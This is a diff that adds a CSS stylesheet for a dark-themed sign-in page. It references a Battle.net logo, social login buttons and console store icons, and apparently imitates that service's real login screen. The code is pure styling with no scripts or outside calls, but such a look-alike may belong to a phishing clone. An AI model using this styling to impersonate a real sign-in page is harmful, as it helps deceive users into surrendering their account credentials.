@@ -1,0 +1,294 @@
+body {
+    background: #1c1e26;
+    font-family: "Object Sans", "Arial", "Helvetica", "Segoe UI Symbol", "Segoe MDL2 Assets", sans-serif;
+    font-size: 16px;
+    line-height: 24px;
+}
+
+main {
+    display: flex;
+    flex-direction: column;      
+    position: relative;
+    width: 416px;
+    margin: 0 auto 25%;
+}
+
+.links {
+    font-weight: 400;
+    color: rgba(255, 255, 255, 0.7);
+    text-decoration: none;
+    font-size: 11px;
+    text-align: center;
+}
+
+.footer_desctop {
+    width: 600px;
+    min-width: auto;
+    margin: 0 auto;
+    font-size: 14px;
+    line-height: 21px;
+}
+
+.footer_text {
+    padding: 8px 0;
+    color: rgba(255, 255, 255, 0.3);
+    font-size: 11px;
+}
+
+span {
+    color: rgba(255, 255, 255, 0.3);
+    margin: 0 5px 0 5px;
+}
+
+.box {
+    margin-top: auto;
+    position: relative;
+    width: 100%;
+    padding: 24px 0;
+    background: none;
+    border: none;
+    box-sizing: border-box;
+    min-height: 100%;
+    margin-bottom: 50%;
+}
+
+.logo {
+    background-image:url(battlenet_logo.svg);
+    margin: 50px auto 38px auto;
+    background-size: contain;
+    background-position: center;
+    background-repeat: no-repeat;
+    width: 240px;
+    height: 72px;
+}
+
+.input {
+    min-width: 290px;
+    max-width: 500px;
+}
+
+.login_header {
+    font-weight: 700;
+    font-size: 32px;
+    line-height: 36px;
+    margin: 40px 0px;
+    text-align: center;
+    color: #ffffff;
+}
+
+.block_line {
+    margin: 40px 0 24px 0;
+    font-style: normal;
+    font-weight: 700;
+    font-size: 14px;
+    font-family: "Noto Sans", "Object Sans", sans-serif;
+    line-height: 21px;
+    text-align: center;
+    color: #ffffff;
+    text-transform: none;
+    overflow: hidden;
+    white-space: nowrap;
+}
+
+.control_group {
+    margin: 0 auto 11px;
+}
+
+.input_block {
+    display: inline-block;
+    vertical-align: middle;
+    height: 40px;
+    padding: 0 12px;
+    margin-top: 3px;
+    margin-bottom: 3px;
+    font-size: 16px;
+    line-height: 24px;
+    border: 1px solid rgba(255, 255, 255, 0.36);
+    background-color: #171920;
+    color: #ffffff;
+    -moz-box-sizing: border-box;
+    box-sizing: border-box;
+    border-radius: 4px;
+    width: 100%;
+}
+
+
+.btn_primary {
+    background-color: #0074e0;
+    color: #ffffff;
+    border: 2px solid transparent;
+    font-weight: 500;
+    border-radius: 4px;
+    margin: 3px 0;
+    padding: 0 20px;
+    font-size: 16px;
+    line-height: 20px;
+    min-height: 40px;
+    width: 100%;
+}
+
+.login_btn {
+    text-align: center;
+    margin-top: 35px;
+}
+
+.help_links {
+    list-style-type: none;
+    text-align: center;
+    margin: 48px 0 0 0;
+    font-size: 16px;
+    line-height: 24px; 
+    margin-bottom: 24px;    
+}
+
+li {
+    line-height: 24px;
+    margin: 0 0 24.75px 0;
+    padding-left: 10px;
+}
+
+.help_link {
+    color: #148eff;
+    text-decoration: none;
+    text-underline-position: under;
+    font-size: large;
+}
+
+i {
+    position: absolute;
+    left: 50%;
+    top: 50%;
+    transform: translate(-50%, -50%);
+    margin: 0;
+}
+
+.icons_social_block {
+    display: flex;
+    flex-flow: row wrap;
+    justify-content: center;
+    align-items: center;
+    margin: 0 40px;
+}
+
+.icon_form {
+    display: block;
+}
+
+.social_icon {
+    position: relative;
+    width: 48px;
+    height: 48px;
+    padding: 13px;
+    border-radius: 4px;
+    margin: 12px;
+    border: none;
+}
+
+.icon-google {
+    background: url(google-logo.svg);
+    opacity: 1;
+    height: 18px;
+    width: 17px;
+}
+
+.facebook {
+    background-color: #1877F2;
+}
+
+.icon-facebook {
+    background: url(facebook-logo.svg);
+    opacity: 1;
+    height: 18px;
+    width: 18px;
+}
+
+.icon-apple {
+    background: url(apple-logo.svg);
+    opacity: 1;
+    height: 19px;
+    width: 15px;
+}
+
+.icons_stores_block {
+    display: flex;
+    flex-flow: row wrap;
+    justify-content: center;
+    align-items: center;
+    margin: 0 40px;
+}
+
+.games_icon {
+    position: relative;
+    width: 48px;
+    height: 48px;
+    padding: 13px;
+    border-radius: 4px;
+    margin: 12px;
+    border: none;
+}
+
+.xbox {
+    background-color: #107c10;
+}
+
+.icon-xbox {
+    background: url(xbox-logo.svg);
+    opacity: 1;
+    height: 16px;
+    width: 16px;
+}
+
+.ps {
+    background-color: #0070CC;
+}
+
+.icon-ps {
+    background: url(playstation-logo.svg);
+    opacity: 1;
+    height: 15px;
+    width: 21px;
+}
+
+.nd {
+    background-color: #e60012;
+}   
+
+.icon-nd {
+    background: url(switch-logo.svg);
+    opacity: 1;
+    height: 16px;
+    width: 16px;
+}
+
+.steam {
+    background-color: #FFF;
+}
+
+.icon-steam {
+    background: url(steam-logo.svg) no-repeat 0 0;
+    opacity: 1;
+    height: 16px;
+    width: 16px;
+}
+
+
+
+.sticks::after {
+    content: " ";
+    background: rgba(255, 255, 255, 0.18);;
+    width: 30%;
+    height: 1px;
+    right: 0%;
+    top: 52.45%;
+    position: absolute;
+}
+
+.sticks::before {
+    content: " ";
+    background: rgba(255, 255, 255, 0.18);;
+    width: 30%;
+    height: 1px;
+    left: 0%;
+    top: 52.45%;
+    position: absolute;
+}
